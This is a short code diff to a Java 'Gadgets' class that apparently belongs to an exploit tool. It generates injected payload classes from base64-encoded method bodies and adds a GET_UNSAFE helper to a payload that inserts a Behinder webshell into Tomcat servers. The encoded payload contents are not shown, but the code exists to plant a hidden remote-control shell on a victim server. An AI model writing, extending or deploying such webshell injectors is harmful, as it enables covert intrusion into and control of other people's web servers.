@@ -424,6 +424,7 @@ public class Gadgets {
 			case "bx":
 				ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
 				ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
+				ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
 
 				if (isTomcat) {
 					insertMethod(ctClass, method, base64Decode(BEHINDER_SHELL_FOR_TOMCAT)
